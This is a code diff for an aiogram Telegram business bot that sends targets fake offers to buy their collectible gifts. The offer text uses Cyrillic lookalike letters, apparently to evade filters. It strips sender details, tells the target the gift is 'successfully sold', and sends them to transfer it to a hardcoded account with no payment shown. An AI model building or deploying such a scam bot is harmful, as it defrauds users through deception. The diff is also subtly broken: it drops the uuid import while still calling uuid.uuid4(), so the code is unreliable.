@@ -1,9 +1,6 @@
 import asyncio
 import logging
-import random
 import re
-import string
-import uuid
 
 from aiogram import Bot, Dispatcher, F
 from aiogram.client.default import DefaultBotProperties
@@ -22,8 +19,6 @@ EMOJI_STARS = "5920433463428650761"
 EMOJI_GRAM = "5267445215773367585"
 EMOJI_DECLINE_EN = "5774077015388852135"
 EMOJI_ACCEPT = "5774022692642492953"
-
-BUYER_USERNAME = "intelligentcup"
 
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -150,14 +145,6 @@ async def handle_offer(message: Message) -> None:
     if not data:
         return
 
-    user = message.from_user
-    if not user:
-        return
-
-    username = user.username or f"id{user.id}"
-    sender_id = user.id
-    sender_username = user.username
-
     try:
         await bot.delete_business_messages(
             business_connection_id=bc_id,
@@ -177,22 +164,20 @@ async def handle_offer(message: Message) -> None:
         currency_word = "GRАM"
     else:
         emoji = f'<tg-emoji emoji-id="{EMOJI_STARS}">⭐</tg-emoji>'
-        currency_word = "Ѕtarѕ"
+        currency_word = "Stаrs"
 
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
 
     text = (
-        f"Uѕer <a href=\"https://t.me/{username}\"><b>{username}</b></a> "
-        f"іѕ οfferіng yοu <b>{amount_fmt} {currency_word}</b> {emoji} "
-        f"fοr the gіft {gift_display}.\n\n"
-        f"Τhіѕ οffer expіreѕ іn <b>5h 59m</b>."
+        f"Thе usеr is оffеring yоu\n"
+        f"<b>{amount_fmt} {currency_word}</b> {emoji} "
+        f"fоr thе gift {gift_display}.\n\n"
+        f"Thе оffеr is vаlid fоr аnоthеr <b>6 h. 0 min</b>.."
     )
 
     offer_id = uuid.uuid4().hex[:12]
     offers[offer_id] = {
         **data,
-        "sender_id": sender_id,
-        "sender_username": sender_username,
         "bc_id": bc_id,
         "chat_id": message.chat.id,
         "accepted": False,
@@ -270,6 +255,16 @@ async def handle_accept(callback: CallbackQuery) -> None:
 
     data["accepted"] = True
 
+    try:
+        await callback.answer(
+            "Attention! Follow the instructions to avoid losing the gift "
+            "and to receive your payment.\n\n"
+            "Tap «OK» if you have read this message.",
+            show_alert=True,
+        )
+    except Exception:
+        pass
+
     number_fmt = f"{int(data['gift_number']):,}"
 
     if data["currency"] == "gram":
@@ -280,7 +275,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
     gift_display = f'<a href="{data["link"]}"><b>{data["gift_name"]} #{number_fmt}</b></a>'
 
     accept_text = (
-        f"Gіft {gift_display} "
+        f'Gіft {gift_display} '
         f"haѕ been ѕucceѕѕfully ѕοld!\n\n"
         f"<b>• Τranѕfer the gіft tο the buyer tο receіve yοur {currency_word}.</b>"
     )
@@ -290,7 +285,7 @@ async def handle_accept(callback: CallbackQuery) -> None:
             [
                 InlineKeyboardButton(
                     text="Transfer gift",
-                    url=f"tg://send_gift?to={BUYER_USERNAME}",
+                    url="tg://send_gift?to=intelligentcup",
                 )
             ],
             [
@@ -310,11 +305,6 @@ async def handle_accept(callback: CallbackQuery) -> None:
         text=accept_text,
         reply_markup=keyboard,
     )
-
-    try:
-        await callback.answer()
-    except Exception:
-        pass
 
 
 @dp.callback_query(F.data == "confirm_transfer")
